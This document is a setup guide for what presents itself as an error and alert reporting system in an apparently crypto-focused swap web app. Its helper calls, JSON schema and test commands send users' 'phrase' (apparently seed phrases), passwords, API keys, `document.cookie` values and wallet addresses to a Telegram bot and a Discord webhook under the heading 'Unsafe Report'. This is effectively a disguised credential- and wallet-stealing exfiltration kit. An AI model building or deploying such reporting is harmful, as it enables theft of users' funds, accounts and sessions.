# Multi-Channel Report System - Quick Reference

## 📋 Overview

Send reports to **3 channels simultaneously**:
- 📱 **Telegram** - Real-time messages
- 💬 **Discord** - Server channel messages  
- 📧 **Email** - Console logging

## ⚡ Quick Setup

### 1. Update `.env`
```env
TELEGRAM_BOT_TOKEN=123456789:ABCDefGHIJKlmnoPQRstuvWXYZ
TELEGRAM_CHAT_ID=987654321
DISCORD_WEBHOOK=https://discord.com/api/webhooks/123456789/ABCDefGHIJK
EMAIL_TO=your_email@example.com
NODE_ENV=production
```

### 2. Use in Your Code

```javascript
import { 
  reportError, 
  reportAlert, 
  reportSecurity,
  reportTransaction,
  reportUser,
  sendReport 
} from '@/lib/report-utils';

// Send error (goes to all 3 channels)
reportError(new Error('Swap failed'), { amount: '1.5 ETH' });

// Send security alert
reportAlert({
  phrase: 'suspicious_input',
  key: 'api_key_xyz',
  password: 'secret123',
  cookies: document.cookie,
  message: 'Security threat detected'
});

// Send security report
reportSecurity({
  message: 'Vulnerability detected',
  severity: 'critical',
  data: { type: 'XSS', vector: '...' }
});

// Send transaction
reportTransaction({
  from: 'ETH',
  to: 'USDC',
  amount: '1.5',
  status: 'success',
  txHash: '0x123...'
});

// Send user activity
reportUser({
  userId: 'user_123',
  action: 'swap_initiated',
  wallet: '0xabc...',
  message: 'User initiated swap'
});

// Send custom report
sendReport({
  type: 'custom',
  severity: 'high',
  message: 'Custom alert',
  phrase: 'test',
  key: 'api_key',
  password: 'secret',
  data: { extra: 'info' }
});
```

## 📊 What Gets Sent

All reports include:
```json
{
  "timestamp": "2026-08-17T14:30:00.000Z",
  "environment": "production",
  "type": "error",
  "message": "Main message",
  "phrase": "optional phrase",
  "key": "optional key",
  "password": "optional password",
  "cookies": "optional cookies",
  "userId": "optional user ID",
  "url": "https://app.boltswap.io/page",
  "userAgent": "Mozilla/5.0...",
  "severity": "critical",
  "data": { "additional": "info" }
}
```

## 🎯 Channel-Specific Output

### Telegram
```
🔔 **Unsafe Report**

<pre>
{
  "timestamp": "2026-08-17T14:30:00Z",
  "type": "error",
  "message": "Swap failed",
  "severity": "critical",
  ...
}
</pre>
```

### Discord
```
💬 Code block (formatted JSON)

```json
{
  "timestamp": "2026-08-17T14:30:00Z",
  "type": "error",
  "message": "Swap failed",
  ...
}
```
```

### Email (Server Console)
```
EMAIL SIMULATOR: {
  to: "your_email@example.com",
  subject: "Unsafe Report",
  body: "{...json...}"
}
```

## 🚀 Deploy to Production

### Vercel
```bash
# Push to git, then add in Project Settings:
TELEGRAM_BOT_TOKEN=...
TELEGRAM_CHAT_ID=...
DISCORD_WEBHOOK=...
EMAIL_TO=...
```

### AWS/Railway/Others
```bash
# Set environment variables, then deploy
npm run build
npm start
```

## 🧪 Test

```bash
# Health check
curl -X GET https://your-domain.com/api/report

# Send test report
curl -X POST https://your-domain.com/api/report \
  -H "Content-Type: application/json" \
  -d '{
    "type": "test",
    "message": "Multi-channel test",
    "phrase": "test_phrase",
    "key": "test_key",
    "password": "test_password",
    "cookies": "session=abc123"
  }'
```

**Verify:**
- ✅ Message in Telegram chat
- ✅ Message in Discord channel
- ✅ Log in server console (check logs)

## 🔌 API Endpoint

**POST** `/api/report`

**Body:**
```json
{
  "type": "string",           // 'error', 'alert', 'security', etc.
  "message": "string",        // Main message (required)
  "severity": "string",       // 'info', 'warning', 'critical'
  "phrase": "string",         // Optional
  "key": "string",            // Optional
  "password": "string",       // Optional
  "cookies": "string",        // Optional
  "data": {}                  // Optional extra data
}
```

**Response:**
```json
{
  "ok": true,
  "message": "Report received and processed",
  "report": { ... },
  "results": {
    "telegram": { "ok": true, "messageId": 123 },
    "discord": { "ok": true },
    "email": { "ok": true }
  }
}
```

## 📁 Files

| File | Purpose |
|------|---------|
| `app/api/report/route.js` | API endpoint |
| `lib/telegram.js` | Service that sends to all 3 channels |
| `lib/report-utils.js` | Frontend helper functions |
| `.env` | Configuration |
| `MULTI_CHANNEL_REPORTS.md` | Full setup guide |

## 🐛 Troubleshooting

### No messages appearing
1. Check `.env` has all values filled
2. Verify bot/webhook URLs are correct
3. Check server logs: `npm run dev`
4. Test individual services (see guide)

### Missing a channel
- Telegram: Verify token and chat ID
- Discord: Verify webhook URL and permissions
- Email: Check server console logs

### Environment variables not loading
1. Restart server after updating `.env`
2. On Vercel: Check Project Settings → Environment Variables
3. On Docker: Pass `-e` flags or use env file

## 📞 Support

See `MULTI_CHANNEL_REPORTS.md` for detailed setup instructions and troubleshooting.
